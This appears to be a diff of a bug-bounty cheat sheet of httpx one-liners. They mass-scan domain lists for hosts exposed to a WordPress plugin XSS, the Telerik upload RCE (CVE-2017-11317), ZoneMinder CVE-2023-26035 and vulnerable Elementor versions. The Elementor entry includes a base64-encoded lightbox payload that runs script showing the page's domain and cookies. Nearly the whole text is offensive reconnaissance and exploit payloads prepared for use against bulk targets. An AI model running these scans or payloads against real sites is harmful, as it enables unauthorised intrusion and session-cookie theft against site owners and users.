@@ -47,9 +47,11 @@
 ## wordpressXss:
     cat domain.txt | httpx -path "/wp-admin/admin-ajax.php?action=ptp_design4_color_columns&post_id=1&column_names=%3Ch1%3EAkira%3C/h1%3E" -ms "<h1>Akira</h1>" -fe "Location: .*<h1>Akira</h1>.*" -t 200 -mc 200
 
-## Telerik RCE(CVE-2017-11317)
-    cat subs.txt | /workspace/go/bin/httpx -path "/Telerik.Web.UI.WebResource.axd?type=rau" -ms '"RadAsyncUpload handler is registered succesfully' -t 200 -o telerik2.txt
-
+## Telerik_RCE(CVE-2017-11317)
+    cat subs.txt | httpx -path "/Telerik.Web.UI.WebResource.axd?type=rau" -ms '"RadAsyncUpload handler is registered succesfully' -t 200 -o telerik2.txt
+    
+## zoneminder_RCE CVE-2023-26035
+    cat alldomains.txt | httpx -path "/index.php" -ms "__csrf_magic" -t 200 -o CVE-2023-26035.txt
 ## Elementor Xss
     cat subs.txt | httpx -path "wp-content/plugins/elementor/readme.txt" -mr "(?i)Stable tag: (3\.[0-5]\.[0-5]\d*)" -o elementor.txt -t 200
     www.target.com/#elementor-action:action=lightbox&settings=ewogICAgInR5cGUiOiAidmlkZW8iLAogICAgInVybCI6ICJodHRwOi8vIiwKICAgICJ2aWRlb1R5cGUiOiAiaG9zdGVkIiwKICAgICJ2aWRlb1BhcmFtcyI6IHsKICAgICAgICAib25lcnJvciI6ImFsZXJ0KGRvY3VtZW50LmRvbWFpbisnICcrZG9jdW1lbnQuY29va2llKSIsCiAgICAgICAgInN0eWxlIjogImJhY2tncm91bmQtY29sb3I6cmVkIgogICAgfQp9
